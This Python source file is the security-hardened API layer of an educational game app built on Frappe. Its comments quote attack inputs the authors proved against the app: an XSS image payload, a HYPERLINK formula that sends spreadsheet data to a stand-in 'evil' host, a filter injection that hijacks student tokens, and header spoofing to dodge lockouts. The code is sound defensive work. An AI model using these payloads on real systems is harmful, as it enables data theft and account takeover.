"""
Hikmat public API — the bridge between the game (student UI) and Frappe.

The game fetches get_courses()/get_structure()/get_settings() instead of using a
hardcoded COURSES array, and posts submit_attempt() when a lesson activity ends.
Output of get_courses() matches the game's COURSES shape 1:1.

Performance: the read endpoints are cached in Redis (content rarely changes) and
busted on any content edit via doc_events (see hooks.py) — this turns the old
~hundreds-of-queries-per-boot into one cheap cache hit. See clear_content_cache().

Abuse: writes (submit_attempt, signup_student) and login (login_student) are
rate-limited / locked-out via Redis counters. These endpoints are allow_guest, so
treat every input as untrusted: validate the student and clamp all numbers.
"""
import hashlib
import hmac
import ipaddress
import json
import os
import re
import time
import unicodedata

import frappe
from frappe import _
from werkzeug.security import check_password_hash, generate_password_hash

# ---------------------------------------------------------------------------
# Caching (content is read far more than it changes)
# ---------------------------------------------------------------------------
COURSES_CACHE_KEY = "hikmat:courses"
STRUCTURE_CACHE_KEY = "hikmat:structure"
SETTINGS_CACHE_KEY = "hikmat:settings"


_CACHE_TTL = 3600  # busted immediately on content edit via doc_events; TTL is a safety net


def _cached(key, builder):
    val = frappe.cache().get_value(key)
    if val is None:                      # cache miss (an empty list/dict is cached as-is)
        val = builder()
        frappe.cache().set_value(key, val, expires_in_sec=_CACHE_TTL)
    return val


def clear_content_cache(doc=None, method=None):
    """Bust the read caches. Wired to content doctype on_update/on_trash in hooks.py,
    and called by setup_data.seed_content(). The (doc, method) args let it be a doc event."""
    c = frappe.cache()
    for k in (COURSES_CACHE_KEY, STRUCTURE_CACHE_KEY, SETTINGS_CACHE_KEY):
        c.delete_value(k)


# ---------------------------------------------------------------------------
# Small helpers
# ---------------------------------------------------------------------------
def _int(v, default=0):
    try:
        return int(v)
    except (TypeError, ValueError):
        return default


def _docname(val, maxlen=140):
    """Coerce a caller-supplied DOCUMENT NAME to a scalar string; return "" for anything
    that isn't one.

    Frappe's whitelist layer hands parameters through as parsed JSON, so a "name" argument
    can arrive as a dict or a list — and frappe.db.get_value(doctype, {...}) treats a dict as
    a FILTER. Proven: clip={"status": "in_verification"} made get_boli_audio select and stream
    a clip the caller never named, sidestepping the queue's own-clip / already-seen exclusions
    (a latent IDOR primitive). Non-strings are REJECTED rather than str()-ed, so a probe fails
    as not_found instead of quietly resolving to "{'status': 'in_verification'}"-shaped junk.
    Length is capped because a document name cannot exceed the Link column width anyway."""
    if val is None or isinstance(val, (bool, dict, list, tuple, set, bytes, bytearray)):
        return ""
    if isinstance(val, (int, float)):            # a numeric autoname arrives as a JSON number
        val = str(val)
    if not isinstance(val, str):
        return ""
    return val.strip()[:maxlen]


# A COMPLETE tag only: the closing ">" is REQUIRED, and that is a data-integrity control.
# With it optional ("<[^>]*>?") the greedy [^>]* swallowed everything after an UNPAIRED "<"
# to the end of the string, so an ordinary Bhojpuri sentence containing a comparison lost
# its whole tail with no marker: 'और 1 < 5 क्‍ष दिन‍' came back as 'और 1' — 17 characters and
# two ZWJ conjuncts silently deleted from the corpus this project exists to build. A lone
# "<" is not a tag; it is a character she typed, and only the character is dropped (by the
# unconditional replace() in _plain_text, which is what actually guarantees the result is
# untaggable — this regex only strips tag BODIES so attributes don't survive as text).
_TAG_RE = re.compile(r"<[^>]*>")

# Format (Cf) characters that MUST survive ingest — an ALLOWLIST, deliberately tiny.
#
# U+200C ZWNJ and U+200D ZWJ are not decoration in Devanagari: they pick the half-form vs
# the conjunct — "क्" + ZWJ + "ष" is spelled differently from the plain conjunct "क्ष" — and they
# finalise a word ("दिन" + ZWJ). They are part of how Hindi and Bhojpuri are actually
# written. str.isprintable() is False for every Cf character, so the old filter silently
# deleted them: in an app whose PURPOSE is faithful dialect capture that is corpus
# corruption, not hygiene. (It also broke ZWJ-compound emoji — the family/profession
# sequences — which is what an avatar can be.)
#
# Everything else invisible stays OUT, on purpose:
#   U+FEFF ZWNBSP/BOM       — an encoding artefact, never spelling; pads a value invisibly
#   U+00AD SOFT HYPHEN      — a line-break hint, never part of a word
#   U+200E/200F, U+202A-202E — bidi marks/overrides: Devanagari is LTR and needs none, and
#                             an override can visually reorder a facilitator's grid row
#   U+2060 word joiner etc. — no orthographic role in this corpus
# Adding to this tuple means arguing for one specific character; do not widen it to "all Cf".
# Written as escapes on purpose — these characters are INVISIBLE in a source file.
_KEEP_FORMAT = ("\u200c", "\u200d")             # ZWNJ, ZWJ


def _plain_text(val):
    """Plain-text-ify student free text at ingest: markup out, every letter kept
    (Devanagari, spaces, apostrophes, hyphens all survive).

    Deliberately NOT html-escaped. These same strings are replayed to the girl in
    the game, which escapes on render — storing "&lt;img" would show her the entity
    text. Escaping belongs at the output sink (see the Boli Adjudication Queue
    report, whose grid assigns cell HTML directly). Dropping every leftover angle
    bracket is what makes the result untaggable, even from a payload crafted to
    survive the tag regex — that property must hold whatever else changes here.

    Accepts any type (a whitelisted argument can arrive as a dict/list), so it doubles
    as the coercion for free-text fields."""
    s = _TAG_RE.sub(" ", str(val or "")).replace("<", "").replace(">", "")
    s = " ".join(s.split())                      # newlines/tabs → single spaces
    # Controls out, the two Indic joiners back in (see _KEEP_FORMAT for why).
    return "".join(ch for ch in s if ch.isprintable() or ch in _KEEP_FORMAT)


def _content_key(val, maxlen=140):
    """A client-supplied CONTENT key (track / lesson / activity / tool / lang …) → a scalar,
    markup-free, formula-inert, length-clamped string.

    These arrive from the game as content ids, but nothing stops a caller sending anything at
    all, and they are DENORMALISED onto Lesson Attempt / Lesson Doubt / Learning Event — the
    very rows the facilitator reports render. Proven on 2026-07-28: submit_attempt stored
    track='<img src=x onerror=…>' verbatim and it EXECUTED in a System Manager's Desk grid via
    the real report path. Note frappe pre-sanitizes form_dict for GUESTS only
    (frappe/__init__.py), and a JSON-quoted payload slips past its bleach layer anyway — so an
    authenticated learner's write has NO framework guard. This is the app's own guard; every
    persisted content key goes through it.

    Order matters: _docname first (a dict/list becomes "" instead of str()-ed junk that would
    then be stored — see _docname), then _plain_text, then the formula-lead strip, then the
    clamp. The clamp is not cosmetic either: a Data column is varchar(140) and frappe raises
    on an overlong value, so an unclamped field is also a 500."""
    return _no_formula_lead(_plain_text(_docname(val, maxlen)))[:maxlen]


# An IDENTIFIER-shaped field may not OPEN with a spreadsheet formula lead. Excel /
# LibreOffice / Sheets evaluate a cell that starts with one of these, and a leading TAB/CR
# can shift the rest of the value into a cell that then leads with "=". Proven: a plain
# guest self-registered '=HYPERLINK("http://evil/?"&A1,"HI")' and it became a LIVE formula
# cell in the Attendance Summary XLSX a facilitator exported.
#
# report_utils.formula_guard neutralises this at the OUTPUT sink (which is also what renders
# rows stored BEFORE this fix inert); this is the INGEST half. Both halves are load-bearing,
# and the ingest half is the only DURABLE one: two export paths never reach a report's
# execute() at all — frappe's prepared-report automation and the Desk list/report-view export
# (frappe.desk.reportview.export_query) — so a guard that lives only in our report code is
# bypassable through machinery we do not control. Refusing the payload at ingest is not.
#
# ==> WHAT THIS MUST NEVER BE APPLIED TO <==
# A girl's own PROSE — a transcription, a doubt question, a free prompt she recorded — is
# never touched, even if it opens with "=" or "-". Rewriting her words to make a spreadsheet
# happy would corrupt the Bhojpuri corpus this project exists to build, and "- बाजार में"
# or "=5" is a legitimate thing to write. Prose stays protected by the OUTPUT guard, which
# is lossless (it prefixes a cell, it does not edit the stored value). The distinction is
# exactly: identifier-shaped (a name, a lesson key, a device id, a category slug) → strip
# the lead here; anything she composed → leave it alone.
_NAME_FORMULA_LEAD = "=+-@\t\r\n"


def _no_formula_lead(s):
    """Drop leading formula characters (and the whitespace they hide behind) from an
    IDENTIFIER-shaped value. Only the LEAD is touched — everything after the first real
    character survives byte-for-byte, so "life-skills", "x=y" and "गुड़िया देवी" are
    unchanged. Read the note above before reusing this on anything a learner composed."""
    while s and s[0] in _NAME_FORMULA_LEAD:
        s = s[1:].lstrip()
    return s


def _display_name(val, maxlen=40):
    """Normalise a SELF-REGISTERED display name (signup_student / signup_online).

    Neutralise rather than reject: the game surfaces one generic "could not sign up" message
    for every signup error, so a refusal would leave a girl retyping the same name forever
    with nothing to correct. A human name never starts with = + - @ (or a tab/CR), so
    stripping that lead loses nothing real; a name made of NOTHING else comes back too short
    and the caller's own 2–40 length check answers bad_name.

    Only the LEAD is touched. Letters, spaces, apostrophes and hyphens inside the name, and
    Devanagari (including ZWJ/ZWNJ conjuncts), survive byte-for-byte — "D'Souza Rani-Kumari"
    and "गुड़िया देवी" must be stored exactly as she typed them."""
    return _no_formula_lead(_plain_text(val)[:maxlen])


# ---------------------------------------------------------------------------
# Abuse ceilings — per-IP / per-student rate limits.
#
# Two things have to be right for a rate limit to mean anything: the KEY must be
# something the caller cannot choose (see _client_ip), and the WINDOW must actually
# close (see _rate_ok). Both were wrong before; see the notes on each.
# ---------------------------------------------------------------------------
_RL_PREFIX = "hikmat:rl2:"          # rl2: the rl: keys held pickled values; INCR can't touch those

# WHICH DIRECT PEERS may speak for someone else through X-Forwarded-For.
#
# X-Forwarded-For is only evidence when the socket peer is a proxy of OURS: nginx APPENDS
# the peer it saw ($proxy_add_x_forwarded_for), so the entries our own proxies wrote are
# trustworthy and everything further left is text the client chose. If the peer is not one
# of ours, the entire header is client input and is IGNORED — the correct, unspoofable
# answer for a directly exposed `bench serve` or a mapped container port.
#
# This replaced a hop COUNT (`hikmat_trusted_proxy_hops`, default 1), which was wrong in
# both directions and UNDETECTABLY so:
#   * one hop too high → we read attacker-written text, so every per-IP ceiling AND the
#     PIN lockout were spoofable (proven over HTTP: 20 wrong PINs on one account from 20
#     spoofed headers never tripped the 8-try lockout);
#   * one hop too low  → we key on our own proxy, so every client on the site collapses
#     into ONE bucket, and with the fail-closed signup/capture ceilings that is a
#     site-wide lockout.
# Nothing inside the app could tell those apart, and production having one hop more than
# configured is entirely plausible (a managed host fronts sites with its own layer). Trust
# is now a property of the ADDRESS, which needs no per-deployment number: the default is
# already correct for direct exposure AND for nginx-on-localhost.
#
# Default = loopback + RFC1918 + link-local + unique-local, i.e. exactly where a reverse
# proxy of ours can sit. A PUBLIC address is never trusted by default, so a CDN or an
# external load balancer must be named explicitly:
#     "hikmat_trusted_proxies": ["203.0.113.0/24", "2001:db8::/32"]
# An EMPTY list means "trust nobody" — ignore X-Forwarded-For entirely (what the dev
# bench sets, since localhost is otherwise a trusted peer and the header would be
# spoofable from a shell on the same machine).
_DEFAULT_TRUSTED_PROXIES = (
    "127.0.0.0/8", "::1/128",                            # loopback — nginx on this host
    "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",     # RFC1918 — proxy on the LAN/bridge
    "169.254.0.0/16", "fe80::/10",                        # link-local
    "fc00::/7",                                           # IPv6 unique-local (containers)
)

_TRUSTED_NETS_CACHE = {}     # parsed CIDRs, keyed by the raw config value (parse once)


def _conf_warn(tag, msg, *args):
    """Log a CONFIGURATION problem once per request per `tag`.

    A misconfigured proxy model is dangerous precisely because it is SILENT — both wrong
    directions look identical from outside the app. Everything that can only be diagnosed
    from inside says so here, naming the config key. Once per tag per request, so a
    permanent misconfiguration cannot turn every request into a log write (and the file
    rotates: frappe's logger keeps 20 × 100 KB).

    Logged at ERROR on purpose, and not because it is fatal. frappe's own default is
    `logging.WARNING if frappe._dev_server else logging.ERROR` (frappe/utils/logger.py), so
    a .warning() call is DISCARDED on every real deployment — verified on this bench: the
    first version of this function logged nothing at all to logs/hikmat.log. A warning that
    only appears on a developer's laptop is the same silence this exists to remove."""
    try:
        seen = getattr(frappe.local, "_hikmat_conf_warned", None)
        if seen is None:
            seen = set()
            frappe.local._hikmat_conf_warned = seen
        if tag in seen:
            return
        seen.add(tag)
        frappe.logger("hikmat").error(msg, *args)
    except Exception:
        pass


def _trusted_proxies():
    """The trusted-proxy networks: site_config `hikmat_trusted_proxies` (a list of IPs or
    CIDRs, or a comma/space-separated string; an empty list = trust nobody) else
    _DEFAULT_TRUSTED_PROXIES. Parsed once per distinct config value — this runs on every
    rate-limited request."""
    conf = getattr(frappe, "conf", None) or {}
    if "hikmat_trusted_proxy_hops" in conf:
        _conf_warn("hops", "hikmat: `hikmat_trusted_proxy_hops` is OBSOLETE and ignored — "
                           "the client IP now comes from the trusted-proxy model. Replace it "
                           "with `hikmat_trusted_proxies` (list of IPs/CIDRs) in site_config.json.")
    raw = conf.get("hikmat_trusted_proxies", None)
    if raw is None:
        raw = _DEFAULT_TRUSTED_PROXIES
    if isinstance(raw, str):
        raw = [p for p in re.split(r"[,;\s]+", raw) if p]
    if not isinstance(raw, (list, tuple)):
        _conf_warn("trusted-type", "hikmat: `hikmat_trusted_proxies` must be a list of "
                                   "IPs/CIDRs (got %r) — treating it as EMPTY, so "
                                   "X-Forwarded-For is ignored.", raw)
        raw = ()
    ck = tuple(str(x) for x in raw)
    cached = _TRUSTED_NETS_CACHE.get(ck)
    if cached is None:
        nets, bad = [], []
        for item in ck:
            try:
                nets.append(ipaddress.ip_network(item.strip(), strict=False))
            except ValueError:
                bad.append(item)               # a typo'd CIDR must not silently widen/narrow trust
        cached = (tuple(nets), tuple(bad))
        _TRUSTED_NETS_CACHE[ck] = cached
    nets, bad = cached
    if bad:                                    # warned per REQUEST, not per parse: a config
        _conf_warn("trusted-bad",              # error must stay visible after the cache warms
                   "hikmat: `hikmat_trusted_proxies` entries are not IPs/CIDRs and were "
                   "ignored: %s", ", ".join(repr(b) for b in bad))
    return nets


def _is_trusted_proxy(ip, nets):
    """True when the normalised address `ip` is inside one of `nets`. A v4-vs-v6 mismatch
    is simply False (ipaddress defines containment across versions as false), so mixing
    families in the config is safe."""
    if not ip:
        return False
    try:
        addr = ipaddress.ip_address(ip)
    except ValueError:
        return False
    return any(addr in n for n in nets)


def _norm_ip(val):
    """One X-Forwarded-For / peer token → a canonical bare IP, or "" if it isn't one.

    Strips [brackets] and a trailing :port, and canonicalises the address so the same
    host cannot be re-spelled into a second bucket: 2001:DB8::0:1 and 2001:db8::1 are
    one key, and an IPv4-MAPPED IPv6 address is folded onto its IPv4 form
    (::ffff:1.2.3.4 → 1.2.3.4). That last fold is done explicitly here because
    ipaddress does NOT do it — str(ip_address('::ffff:1.2.3.4')) is still
    '::ffff:1.2.3.4' (this comment used to claim otherwise). It matters twice over:
    two spellings of one host would otherwise be two rate-limit buckets, and
    _is_trusted_proxy above would not recognise ::ffff:127.0.0.1 as loopback.

    Anything that isn't an IP at all ("unknown", a hostname, junk) comes back empty so
    the caller falls through to a trustworthy source."""
    s = str(val or "").strip()
    if not s:
        return ""
    if s.startswith("["):                      # [2001:db8::1]:443  →  2001:db8::1
        s = s[1:].split("]", 1)[0]
    elif s.count(":") == 1:                    # 1.2.3.4:5678 — one colon is a port;
        s = s.split(":", 1)[0]                 # a bare IPv6 address always has two or more
    try:
        ip = ipaddress.ip_address(s)
    except ValueError:
        return ""
    mapped = getattr(ip, "ipv4_mapped", None)  # IPv6Address only; None for a real v6 host
    return str(mapped or ip)


def _client_ip():
    """The caller's IP — the key every rate limit and the PIN lockout's per-source counter
    hang on, so it must be something the caller CANNOT choose.

    Deliberately NOT frappe.local.request_ip: Frappe takes the FIRST X-Forwarded-For token,
    which is 100% client-supplied, so a flood mints a fresh bucket per request just by
    varying the header (proven: 5 spoofed values → 5 independent buckets → every per-IP
    ceiling in the app bypassable, including pre-auth signup).

    The model (see _DEFAULT_TRUSTED_PROXIES for why it is not a hop count):
      1. the socket peer (request.remote_addr) is the only address nobody can forge;
      2. if that peer is NOT a trusted proxy, X-Forwarded-For is pure client input → ignore
         the header completely and key on the peer. Correct for direct exposure;
      3. if it IS a trusted proxy, walk the header RIGHT-TO-LEFT (nginx appends), skipping
         addresses that are themselves trusted proxies of ours, and take the first
         untrusted entry: that is the address our outermost proxy actually saw. Anything
         left of it is text the client wrote and is never read;
      4. no header, an unreadable entry where our proxy should have written a real address,
         or a chain that is trusted all the way down → fall back to the peer, and LOG it
         (step 4 means one shared bucket for every client, which is exactly the failure an
         operator must be able to see).

    Returns a canonical bare IP string, or "unknown" when there is no request at all
    (background job, scheduler, `bench execute`)."""
    req = getattr(frappe.local, "request", None)
    peer = _norm_ip(getattr(req, "remote_addr", None) if req is not None else None)
    if req is None:
        return peer or "unknown"
    nets = _trusted_proxies()
    if not _is_trusted_proxy(peer, nets):
        return peer or "unknown"               # direct exposure: the header is not evidence
    headers = getattr(req, "headers", None)
    raw = ""
    if headers is not None:
        # Several X-Forwarded-For headers are ONE chain (RFC 7230 §3.2.2); WSGI usually
        # joins them already, but .get() would return only the first — so join explicitly.
        vals = None
        try:
            vals = headers.get_all("X-Forwarded-For")
        except (AttributeError, TypeError):
            vals = None
        raw = ", ".join(v for v in (vals or []) if v) or (headers.get("X-Forwarded-For") or "")
    parts = [p for p in (t.strip() for t in raw.split(",")) if p]   # blank entries dropped
    unusable = None
    for tok in reversed(parts):
        ip = _norm_ip(tok)
        if not ip:                             # our proxy writes real addresses; junk here
            unusable = tok                     # means the trust assumption is broken →
            break                              # stop rather than keep reading leftwards
        if _is_trusted_proxy(ip, nets):
            continue                           # another proxy of ours — keep walking left
        return ip                              # ← the client, as our own proxy saw it
    # Warn whether or not the header had usable entries. A trusted peer that sends NO
    # X-Forwarded-For at all (a container with a mapped port, or a proxy that only sets
    # X-Real-IP) collapses every client onto the peer address exactly as a
    # trusted-all-the-way-down chain does — and that case used to be skipped by an
    # `if parts:` guard, so the single most dangerous misconfiguration was the one that
    # logged nothing. Fail loudly: fail-closed ceilings now hang on this value.
    _conf_warn("xff-no-client",
               "hikmat: X-Forwarded-For %r from trusted peer %s yielded no client "
               "address (%s), so rate limits and the login lockout are keyed on the "
               "PROXY — every client shares one bucket. Check `hikmat_trusted_proxies` "
               "in site_config.json.", raw, peer,
               "unreadable entry %r" % (unusable,) if unusable
               else ("no X-Forwarded-For header" if not parts else "every entry is trusted"))
    return peer or "unknown"


@frappe.whitelist()   # STAFF-ONLY — enforced by _require_staff(), not by the decorator
def whoami_ip():
    """What this request's client IP resolves to, and why. The ONE thing an operator cannot
    otherwise check from outside: a wrong proxy model is invisible (both failure directions
    look identical from a browser), so verifying the real production topology needs a view
    from inside. Open this from a device whose public IP you know: `client_ip` must equal it.
    If it comes back as your proxy's address instead, add that proxy's range to
    `hikmat_trusted_proxies`; if it echoes something you can set yourself, the peer is being
    trusted when it should not be (set the list to []).

    Staff only, and it discloses nothing the caller did not send about itself."""
    _require_staff()
    req = getattr(frappe.local, "request", None)
    headers = getattr(req, "headers", None) if req is not None else None
    return {
        "client_ip": _client_ip(),                       # what every limiter/lockout keys on
        "socket_peer": _norm_ip(getattr(req, "remote_addr", None) if req is not None else None),
        "x_forwarded_for": (headers.get("X-Forwarded-For") if headers is not None else None) or "",
        "peer_is_trusted_proxy": _is_trusted_proxy(
            _norm_ip(getattr(req, "remote_addr", None) if req is not None else None),
            _trusted_proxies()),
        "trusted_proxies": [str(n) for n in _trusted_proxies()],
        "configured": "hikmat_trusted_proxies" in (getattr(frappe, "conf", None) or {}),
    }


def _rl_cache():
    """The Redis handle the limiters use. Its own accessor so an outage can be simulated
    (tests, ops drills) at exactly the seam that matters, without knocking out the cache
    the rest of the request needs."""
    return frappe.cache()


def _rl_warn(bucket, exc, denied):
    """Log an unavailable limiter ONCE per request (an outage must not itself become a
    write storm in the Error Log)."""
    try:
        if getattr(frappe.local, "_hikmat_rl_warned", False):
            return
        frappe.local._hikmat_rl_warned = True
        # .error(), NOT .warning(): frappe's default log level is WARNING only on a dev
        # server and ERROR everywhere else (utils/logger.py), so a .warning() here would be
        # discarded in production — and this is the ONE new failure mode of the limiter
        # rewrite (signup and voice capture refused because the cache is down). An outage
        # that leaves no evidence is indistinguishable from a spoofing attack.
        frappe.logger("hikmat").error(
            "rate limiter unavailable (%s: %s) — bucket %r %s",
            type(exc).__name__, exc, bucket, "DENIED (fail-closed)" if denied else "ALLOWED (fail-open)")
    except Exception:
        pass


def _rate_ok(bucket, limit, seconds, fail_closed=False):
    """True if `bucket` is still under `limit` inside a FIXED window of `seconds`.

    FIXED, not sliding: the TTL is armed once, when the counter is created, and is never
    refreshed by a later hit, so the window really closes. (The old code re-set the TTL on
    every hit and documented that as intentional — it isn't: a client hitting faster than
    the TTL kept its window, and therefore its own block, alive forever. On a shared
    classroom IP that turns an abuse ceiling into a self-inflicted outage.) INCR is atomic,
    so concurrent laptops can't race past the ceiling either.

    Availability tradeoff — this app runs a rural classroom on flaky 2G, and a cache hiccup
    must never stop a child learning:
      * fail_closed=False (default) → an unavailable limiter ALLOWS the call. Used for the
        cheap, already-authenticated game writes (attempts, module tests, doubts, events,
        attendance, transcribe/verify). Losing an abuse ceiling for the length of a Redis
        outage is far less harmful than a room of girls unable to save their work.
      * fail_closed=True → an unavailable limiter DENIES the call. Reserved for the paths
        where an uncapped flood is genuinely destructive: signup (pre-auth, mints Student
        rows + 90-day tokens) and dialect capture (writes audio bytes to disk), plus the AI
        endpoints (an open-ended LLM must never run uncapped). Lessons keep working while
        those are refused, and the client's outbox treats `rate_limited` as transient, so a
        refused capture is retried when the limiter returns rather than lost.
    Either way the outage is logged (see _rl_warn) so it is visible rather than silent.

    NOTE the numeric ceilings at the call sites are deliberately generous: a whole
    classroom shares one public IP, so tightening them would lock out honest cohorts."""
    try:
        c = _rl_cache()
        key = c.make_key(_RL_PREFIX + bucket)
        n = c.incr(key)                        # creates the counter at 1 when absent
        if n <= 1:                             # brand-new counter → start the window ONCE.
            c.expire(key, seconds)             # never re-armed below: the window closes.
        return n <= limit
    except Exception as e:
        _rl_warn(bucket, e, fail_closed)
        return not fail_closed


def _rate_state(bucket):
    """(count, ttl_seconds) for a live bucket; ttl is -2 when the key is gone, -1 when it
    has no expiry. Introspection for tests and for ops checking a blocked classroom — the
    counters are plain INCR integers, not pickled cache values, so read them raw."""
    c = _rl_cache()
    key = c.make_key(_RL_PREFIX + bucket)
    raw = c.get(key)
    if isinstance(raw, bytes):
        raw = raw.decode()
    return _int(raw, 0), _int(c.ttl(key), -2)


def _rate_reset(bucket):
    """Drop one bucket. Used by tests, and by hand when ops needs to unblock a classroom."""
    c = _rl_cache()
    c.delete(c.make_key(_RL_PREFIX + bucket))


# ---------------------------------------------------------------------------
# Auth helpers — PIN hashing (with legacy-plaintext upgrade) + per-student tokens
# ---------------------------------------------------------------------------
def _hash_pin(pin):
    return generate_password_hash(str(pin), method="pbkdf2:sha256") if pin else ""


def _looks_hashed(stored):
    return str(stored or "").startswith(("pbkdf2:", "scrypt:"))


def _pin_ok(stored, pin):
    """Verify a PIN, FAIL-CLOSED. A profile with no PIN cannot be authenticated — this
    closes the shared-laptop hole where a PIN-less profile opened with zero auth. Hashed
    values use a constant-time hash check; legacy plaintext (pre-hashing) still verifies
    so existing logins keep working until upgraded on next successful login."""
    if not stored or not pin:
        return False                      # no PIN set (or none supplied) → cannot authenticate
    if _looks_hashed(stored):
        return check_password_hash(str(stored), str(pin))
    return hmac.compare_digest(str(stored), str(pin))         # legacy plaintext


_TOKEN_TTL_DAYS = 90


def _token_valid(issued_on):
    """A token is live for _TOKEN_TTL_DAYS since it was last issued/refreshed."""
    if not issued_on:
        return False
    return frappe.utils.time_diff_in_seconds(frappe.utils.now(), issued_on) <= _TOKEN_TTL_DAYS * 86400


def _token_for(student_name):
    """Return a live token for the student, called on every successful login/signup.
    Sliding-window expiry: a still-valid token keeps its VALUE (so a girl stays logged in
    across the shared laptops she's used) but its issued-on slides forward, so an actively
    used account never expires. A missing or expired token is rotated to a fresh value.

    ONE STUDENT, ALWAYS — the coercion + existence check below is a security control, not
    tidiness. frappe.db.set_value(dt, {...}, ...) is an ORM FILTER (that is exactly how
    _erase_boli_data clears a whole column), so a non-scalar reaching here turns this into a
    BULK UPDATE. Proven on 2026-07-28: login_student passed its caller-supplied `student`
    straight through, and login_student({"student_name": ["like", "R2GATE%"]}, "1234")
    rotated TWO girls' auth_token to ONE shared value and handed it back — i.e. one token
    that _token_ok accepts for every matched child (cross-account takeover), plus every
    matched campus laptop logged out. Callers coerce too; this is the sink, so it also
    refuses, and a caller that names nobody gets a fresh throw-away token instead of an
    UPDATE with no WHERE."""
    student_name = _docname(student_name)
    if not student_name or not frappe.db.exists("Student", student_name):
        return frappe.generate_hash(length=40)               # never persisted → authenticates nobody
    row = frappe.db.get_value("Student", student_name, ["auth_token", "token_issued_on"], as_dict=True)
    tok = row.auth_token if row else None
    if not tok or not _token_valid(row.token_issued_on):
        tok = frappe.generate_hash(length=40)                # mint / rotate
    frappe.db.set_value("Student", student_name,
                        {"auth_token": tok, "token_issued_on": frappe.utils.now()},
                        update_modified=False)
    return tok


def _token_ok(student_name, token):
    """Validate a bearer token, FAIL-CLOSED: a student who is DEACTIVATED, has no token, an
    expired token, or a mismatch is rejected. (Legacy token-less students simply re-login,
    which mints one.)

    `active` is checked here, in the same single row read, because deactivating a girl is the
    facilitator's normal offboarding lever and it has to cut off her DEVICE, not just future
    logins. Previously only submit_dialect_capture looked at `active`, so a deactivated
    student's cached token still worked on every other endpoint for up to _TOKEN_TTL_DAYS
    (90) unless someone separately called revoke_student_token — boli_home kept serving her
    private stats and get_boli_queue kept handing her peers' clips. Putting it in the shared
    auth path means every endpoint inherits it, including the ai_* ones that call _token_ok
    directly."""
    row = frappe.db.get_value("Student", _docname(student_name),
                              ["auth_token", "token_issued_on", "active"], as_dict=True)
    if not row or not row.active or not row.auth_token or not _token_valid(row.token_issued_on):
        return False
    return hmac.compare_digest(str(row.auth_token), str(token or ""))


# -- Dual auth: the game has two kinds of learner ------------------------------
# CAMPUS (offline-capable) students are custom Student docs authed by a per-student
# bearer token (_token_ok). ONLINE students are Frappe Website Users, so their request
# already carries a logged-in session — the linked Student is found via Student.user.
# A request is authorized for a student if EITHER proof holds.
def _session_student():
    """The Student linked to the currently logged-in (online) Website User, if any.
    The active=1 filter is load-bearing, not cosmetic: it is what stops a deactivated
    ONLINE learner's live Frappe session from still resolving to her Student (the session
    twin of the deactivated-token hole closed in _token_ok)."""
    u = getattr(frappe.session, "user", None)
    if u and u != "Guest":
        return frappe.db.get_value("Student", {"user": u, "active": 1}, "name")
    return None


def _authorized(student, token):
    """True if the caller may act as `student`: a matching campus token, OR an online
    session whose linked Student is exactly this one. Both proofs require the student to be
    ACTIVE (see _token_ok / _session_student), so every endpoint that gates on _authorized
    inherits the deactivation cut-off and answers `auth` — which the game treats as
    "re-login", the right outcome for a device that has been switched off.

    `student` is coerced to a scalar string first: Frappe's whitelist layer passes through
    whatever JSON the client sent, and a dict here would reach frappe.db.get_value as a
    FILTER and match some arbitrary student. Rejecting non-strings in the shared auth path
    keeps that primitive out of every endpoint behind it."""
    student = _docname(student)
    if student and _token_ok(student, token):
        return True
    ss = _session_student()
    return bool(student and ss and ss == student)


# ---------------------------------------------------------------------------
# STAFF GATE — read this before "simplifying" any call to _require_staff().
#
# `@frappe.whitelist()` (no allow_guest) is NOT an authorization check. It refuses
# exactly one user: Guest. And in THIS app every online learner is a real Frappe
# Website User (see _create_online_user), so a bare whitelist admits every child in
# the programme. That is not theory: on 2026-07-28 an ordinary online learner
# (roles []) was able to POST delete_student and permanently erase another girl's
# entire record, and revoke_student_token to log her out of her own device. The
# comments on those two functions claimed "requires a logged-in Desk user" — the
# decorator never did that. Guests were refused, which is why it went unnoticed.
#
# Staff == System Manager. This project has no dedicated facilitator Role: a
# facilitator IS a Desk user with System Manager. That is the definition used by
# _facilitator_users() below (who gets the "I'm stuck" bell) and by every report,
# query-report and number card in setup_data.py (roles=[{"role": "System Manager"}]),
# and it is how the six Boli doctypes are permissioned. Defining it once, here, means
# introducing a narrower "Hikmat Facilitator" role later is a one-line change in one
# place instead of a hunt through the file.
#
# Fails CLOSED, always: Guest, Website User (i.e. any learner), a Desk user without
# the role, and a session whose roles cannot even be read are all refused. The refusal
# is a PermissionError (HTTP 403), never a soft {"ok": False} — a soft return is
# indistinguishable from "no such student" and would let a prober map the roster.
# ---------------------------------------------------------------------------
_STAFF_ROLE = "System Manager"


def _is_staff():
    """True only for a logged-in session that holds _STAFF_ROLE."""
    user = getattr(frappe.session, "user", None)
    if not user or user == "Guest":
        return False
    try:
        return _STAFF_ROLE in (frappe.get_roles() or [])
    except Exception:                     # unreadable roles are not a grant
        return False


def _require_staff():
    """The one gate for staff-only endpoints — grep for it. Any whitelisted function in
    this file that DELETES, REVOKES, writes to a learner's row on someone else's behalf,
    exports data, or reads roster-wide PII must call this as its FIRST statement (before
    any existence check, so the error can't be used as an oracle)."""
    if not _is_staff():
        frappe.throw(_("Not permitted"), frappe.PermissionError)


# ---------------------------------------------------------------------------
# Facilitator notifications — surface a learner's "I'm stuck" tap (and, later,
# milestone checkpoints) to every facilitator's Desk bell. Best-effort: a
# notification failure must never block the child's action.
# ---------------------------------------------------------------------------
def _facilitator_users():
    """Enabled Desk users who facilitate — currently the System Managers, minus system
    accounts. (A dedicated 'Facilitator' role can be added here later — see _STAFF_ROLE,
    the single definition of "staff" this reads from.)"""
    users = frappe.get_all("Has Role", filters={"role": _STAFF_ROLE, "parenttype": "User"},
                           pluck="parent")
    return [u for u in set(users)
            if u not in ("Administrator", "Guest") and frappe.db.get_value("User", u, "enabled")]


def _notify_facilitators(subject, doctype=None, docname=None):
    """Drop a Desk Notification Log (bell alert) for every facilitator."""
    try:
        for u in _facilitator_users():
            frappe.get_doc({
                "doctype": "Notification Log", "for_user": u, "type": "Alert",
                # The subject is server-composed but interpolates a learner's name and her typed
                # question, and the Desk bell renders it. Callers sanitise their inputs; this is
                # the sink's own guard, so a row stored BEFORE that fix still can't fire here.
                "subject": _plain_text(subject)[:140],
                "document_type": doctype or "", "document_name": docname or "",
            }).insert(ignore_permissions=True)
        frappe.db.commit()
    except Exception:
        frappe.db.rollback()   # doubt was already committed; only the notifications roll back


# ---------------------------------------------------------------------------
# Public read endpoints (cached)
# ---------------------------------------------------------------------------
